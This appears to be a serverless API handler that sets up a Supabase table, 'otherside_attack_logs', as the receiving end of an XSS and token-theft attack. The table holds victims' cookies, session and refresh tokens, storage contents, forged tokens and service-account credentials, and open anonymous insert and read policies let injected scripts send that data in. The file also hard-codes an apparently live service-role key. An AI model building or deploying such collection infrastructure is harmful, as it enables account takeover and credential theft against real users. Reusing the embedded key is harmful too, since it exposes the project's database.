import { createClient } from '@supabase/supabase-js';

// ============================================================
// Supabase Configuration
// ============================================================
const SUPABASE_URL = 'https://anruszfozkhgddzpcpft.supabase.co';
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY ||
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFucnVzemZvemtoZ2RkenBjcGZ0Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzkyMTY3NywiZXhwIjoyMDkzNDk3Njc3fQ.lE3i-A82CpC4f0vTtUC8KvR2SPIepwFmFubLB4d2eaU';

// ============================================================
// SQL Migration for otherside_attack_logs table
// ============================================================
const MIGRATION_SQL = `
-- Create the otherside_attack_logs table
CREATE TABLE IF NOT EXISTS otherside_attack_logs (
    id BIGSERIAL PRIMARY KEY,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    attack_type TEXT NOT NULL,
    victim_email TEXT,
    victim_uid TEXT,
    victim_name TEXT,
    victim_picture_url TEXT,
    id_token TEXT,
    refresh_token TEXT,
    cookies TEXT,
    local_storage TEXT,
    session_storage TEXT,
    notes TEXT,
    xss_target TEXT,
    xss_payload TEXT,
    idor_data JSONB,
    firebase_api_key TEXT,
    attack_vector TEXT,
    endpoint_tested TEXT,
    response_status INTEGER,
    response_error TEXT,
    identity_toolkit_response JSONB,
    custom_token TEXT,
    forged_id_token TEXT,
    forged_refresh_token TEXT,
    impersonated_uid TEXT,
    admin_access_granted BOOLEAN DEFAULT FALSE,
    service_account_email TEXT,
    service_account_project_id TEXT,
    service_account_client_id TEXT,
    service_account_full JSONB
);

-- Enable Row Level Security
ALTER TABLE otherside_attack_logs ENABLE ROW LEVEL SECURITY;

-- Policy: Allow anonymous inserts (for client-side XSS callback payloads)
CREATE POLICY "Allow anonymous inserts" ON otherside_attack_logs
    FOR INSERT
    TO anon
    WITH CHECK (true);

-- Policy: Allow anonymous reads (for PoC data exfiltration verification)
CREATE POLICY "Allow anonymous reads" ON otherside_attack_logs
    FOR SELECT
    TO anon
    USING (true);

-- Policy: Allow service role full access
CREATE POLICY "Allow service role full access" ON otherside_attack_logs
    FOR ALL
    TO service_role
    USING (true)
    WITH CHECK (true);

-- Index for fast lookups by attack_type
CREATE INDEX IF NOT EXISTS idx_attack_logs_attack_type ON otherside_attack_logs(attack_type);

-- Index for fast lookups by victim_uid
CREATE INDEX IF NOT EXISTS idx_attack_logs_victim_uid ON otherside_attack_logs(victim_uid);

-- Index for fast lookups by created_at
CREATE INDEX IF NOT EXISTS idx_attack_logs_created_at ON otherside_attack_logs(created_at DESC);

-- Index for fast lookups by attack_vector
CREATE INDEX IF NOT EXISTS idx_attack_logs_attack_vector ON otherside_attack_logs(attack_vector);
`;

// ============================================================
// Helper: split SQL into individual statements
// ============================================================
function splitSqlStatements(sql) {
    return sql
        .split('\n')
        .filter(line => !line.trim().startsWith('--'))
        .join('\n')
        .split(';')
        .map(s => s.trim())
        .filter(s => s.length > 0);
}

// ============================================================
// Helper: execute SQL via direct PostgreSQL connection (if available)
// ============================================================
async function executeWithPg(sqlStatements) {
    // Dynamic import so it only fails if pg is not installed
    let pg;
    try {
        pg = await import('pg');
    } catch {
        return { success: false, method: null, error: 'pg module not available' };
    }

    const databaseUrl = process.env.DATABASE_URL;
    if (!databaseUrl) {
        return { success: false, method: 'pg', error: 'DATABASE_URL env var not set' };
    }

    const { Pool } = pg.default || pg;
    const pool = new Pool({ connectionString: databaseUrl, ssl: { rejectUnauthorized: false } });

    const results = [];
    try {
        for (const stmt of sqlStatements) {
            const result = await pool.query(stmt);
            results.push({ statement: stmt.substring(0, 80) + '...', success: true });
        }
        return { success: true, method: 'pg', results };
    } catch (error) {
        return { success: false, method: 'pg', error: error.message, partialResults: results };
    } finally {
        await pool.end();
    }
}

// ============================================================
// Helper: attempt setup via Supabase REST API
// Since the REST API cannot execute DDL, we check if the table
// already exists and test read/write. If not, we return the SQL.
// ============================================================
async function checkWithSupabaseClient() {
    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
        auth: { autoRefreshToken: false, persistSession: false }
    });

    const steps = [];
    let tableExists = false;

    // Step 1: Check if table exists by selecting from it
    try {
        const { data, error } = await supabase
            .from('otherside_attack_logs')
            .select('id')
            .limit(1);

        if (error) {
            if (error.message && (error.message.includes('does not exist') || error.message.includes('not found') || error.code === '42P01')) {
                steps.push({ step: 'check_table', status: 'table_not_found', message: error.message });
                tableExists = false;
            } else {
                // Some other error - might still not exist
                steps.push({ step: 'check_table', status: 'error', message: error.message, code: error.code });
                tableExists = false;
            }
        } else {
            steps.push({ step: 'check_table', status: 'table_exists', rowCount: data?.length || 0 });
            tableExists = true;
        }
    } catch (err) {
        steps.push({ step: 'check_table', status: 'exception', message: err.message });
        tableExists = false;
    }

    // Step 2: If table exists, test insert and read
    if (tableExists) {
        try {
            const testRecord = {
                attack_type: 'setup_test',
                victim_email: 'test@setup.local',
                notes: 'Automated setup verification record'
            };

            const { data: insertData, error: insertError } = await supabase
                .from('otherside_attack_logs')
                .insert([testRecord])
                .select();

            if (insertError) {
                steps.push({ step: 'test_insert', status: 'failed', message: insertError.message });
            } else {
                steps.push({ step: 'test_insert', status: 'success', insertedId: insertData?.[0]?.id });

                // Clean up test record
                if (insertData?.[0]?.id) {
                    const { error: deleteError } = await supabase
                        .from('otherside_attack_logs')
                        .delete()
                        .eq('id', insertData[0].id);

                    steps.push({
                        step: 'cleanup_test_record',
                        status: deleteError ? 'failed' : 'success',
                        message: deleteError?.message || 'Test record cleaned up'
                    });
                }
            }
        } catch (err) {
            steps.push({ step: 'test_insert', status: 'exception', message: err.message });
        }

        // Check table structure by reading column info (via a select with limit 0)
        try {
            const { data: schemaData, error: schemaError } = await supabase
                .from('otherside_attack_logs')
                .select('*')
                .limit(0);

            if (!schemaError) {
                steps.push({
                    step: 'verify_schema',
                    status: 'accessible',
                    message: 'Table is readable with service role key'
                });
            }
        } catch (err) {
            steps.push({ step: 'verify_schema', status: 'exception', message: err.message });
        }
    }

    return { tableExists, steps };
}

// ============================================================
// Main handler
// ============================================================
export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'GET' && req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed. Use GET or POST.' });
    }

    const result = {
        status: 'unknown',
        table: 'otherside_attack_logs',
        timestamp: new Date().toISOString(),
        steps: [],
        migrationSql: null,
        instructions: null
    };

    // --------------------------------------------------------
    // Strategy 1: Try direct PostgreSQL connection (if pg + DATABASE_URL available)
    // --------------------------------------------------------
    const statements = splitSqlStatements(MIGRATION_SQL);
    const pgResult = await executeWithPg(statements);

    if (pgResult.success) {
        result.status = 'success';
        result.steps.push({
            strategy: 'direct_postgresql',
            status: 'success',
            message: 'Table created/verified via direct PostgreSQL connection',
            details: pgResult.results
        });

        // Verify with Supabase client
        const clientCheck = await checkWithSupabaseClient();
        result.steps.push(...clientCheck.steps.map(s => ({ ...s, verifiedBy: 'supabase_client' })));

        return res.status(200).json(result);
    }

    // --------------------------------------------------------
    // Strategy 2: Check if table already exists via Supabase REST API
    // --------------------------------------------------------
    result.steps.push({
        strategy: 'direct_postgresql',
        status: 'unavailable',
        message: pgResult.error || 'pg module or DATABASE_URL not configured'
    });

    const clientResult = await checkWithSupabaseClient();
    result.steps.push(...clientResult.steps);

    if (clientResult.tableExists) {
        result.status = 'success';
        result.steps.push({
            step: 'final_status',
            status: 'table_exists_and_accessible',
            message: 'The otherside_attack_logs table exists and is accessible with the service role key.'
        });
        return res.status(200).json(result);
    }

    // --------------------------------------------------------
    // Table does not exist — return SQL + instructions
    // --------------------------------------------------------
    result.status = 'action_required';
    result.migrationSql = MIGRATION_SQL.trim();
    result.instructions = {
        title: 'Table does not exist. Run the SQL migration manually:',
        steps: [
            '1. Go to your Supabase Dashboard: https://supabase.com/dashboard/project/anruszfozkhgddzpcpft',
            '2. Navigate to SQL Editor in the left sidebar',
            '3. Paste the migrationSql from this response into the editor',
            '4. Click "Run" to execute the migration',
            '5. Re-call this endpoint to verify the setup',
        ],
        alternative: 'Or set the DATABASE_URL environment variable to enable automatic table creation via direct PostgreSQL connection.',
        endpoint_to_recheck: `${req.headers.host || 'localhost'}/api/setup-db`
    };

    return res.status(200).json(result);
}
